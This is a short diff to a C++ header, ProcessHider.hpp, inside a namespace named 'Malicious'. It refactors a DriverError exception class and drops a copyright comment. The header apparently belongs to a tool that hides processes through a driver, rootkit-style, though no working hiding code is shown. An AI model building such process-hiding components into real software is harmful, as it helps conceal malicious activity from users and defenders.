@@ -1,9 +1,7 @@
-//!
-//!     Kaleidoscalp, all rights reserved.
-//!
-
 #ifndef _PROCESS_HIDER_HPP_
 #define _PROCESS_HIDER_HPP_
+
+#include "Exception.hpp"
 
 #include <string>
 #include <exception>
@@ -16,10 +14,10 @@ namespace Malicious
     {
         public:
 
-            class DriverError : public std::exception
+            class DriverError : public Exception
             {
                 public:
-                    DriverError();
+                    DriverError(const std::string& argMsgError);
             };
 
             ProcessHider();
